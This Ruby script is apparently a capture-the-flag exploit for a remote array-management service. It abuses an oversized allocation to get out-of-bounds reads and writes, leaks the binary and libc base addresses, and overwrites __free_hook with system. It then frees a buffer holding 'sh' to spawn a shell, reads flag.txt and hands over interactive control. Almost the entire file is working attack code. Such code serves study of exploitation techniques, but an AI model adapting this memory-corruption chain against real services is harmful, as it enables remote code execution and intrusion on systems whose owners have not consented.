#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end

host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port



def list
    command = "list"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def init id, type, length
    command = "init #{id} #{type} #{length}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def delete id
    command = "delete #{id}"
    puts command
    $s.puts command
end

def set id, index, value
    command = "set #{id} #{index} #{value}"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end

def get id, index
    command = "get #{id} #{index}"
    puts command
    $s.puts command
    print answer = $s.expect("\n> ")[0]
    answer[/^\d*/].to_i
end

def quit
    command = "quit"
    puts command
    $s.puts command
    print $s.expect("\n> ")[0]
end


OFFSET_GET64 = 0xa88
OFFSET_GOT_MALLOC = 0x201fa0

OFFSET_LIBC_MALLOC = 0x97070
OFFSET_LIBC_FREE_HOOK = 0x3ed8e8
OFFSET_LIBC_SYSTEM = 0x4f440


print $s.expect("\n> ")[0]

# malloc(0) allocates 24 Bytes
init 'A', 64, 2**61

# allocate 'victim' buffer
init 'B', 64, 10


# Leaking array B
chunk  = get 'A', 3
length = get 'A', 4
type   = get 'A', 5
data   = get 'A', 6
getter = get 'A', 7
setter = get 'A', 8
puts
log("Chunk header: #{[chunk].pack('Q>')}")
log("Lenght: #{length}")
log("Type: #{type}")
log("Data: 0x#{data.to_s(16)}")
log("Getter: 0x#{getter.to_s(16)}")
log("Setter: 0x#{setter.to_s(16)}")

# calculate binary base address
bin_base = getter - OFFSET_GET64
log("BINARY BASE: 0x#{bin_base.to_s 16}")

# leak libc pointer
got_malloc = bin_base + OFFSET_GOT_MALLOC
log("GOT MALLOC: 0x#{got_malloc.to_s 16}")
set 'A', 6, got_malloc
libc_malloc = get 'B', 0
log("LIBC MALLOC: 0x#{libc_malloc.to_s 16}")

# calculate libc base
libc_base = libc_malloc - OFFSET_LIBC_MALLOC
log("LIBC BASE: 0x#{libc_base.to_s 16}")

# overwrite __free_hook with system
libc_free_hook = libc_base + OFFSET_LIBC_FREE_HOOK
log("LIBC FREE HOOK: 0x#{libc_free_hook.to_s 16}")
set 'A', 6, libc_free_hook
libc_system = libc_base + OFFSET_LIBC_SYSTEM
log("LIBC SYSTEM: 0x#{libc_system.to_s 16}")
set 'B', 0, libc_system

# create sh buffer to be freed
init 'C', 8, 10
set 'C', 0, 's'.ord
set 'C', 1, 'h'.ord
delete 'C'


sleep 1
$s.puts "cat flag.txt"



$s.interact
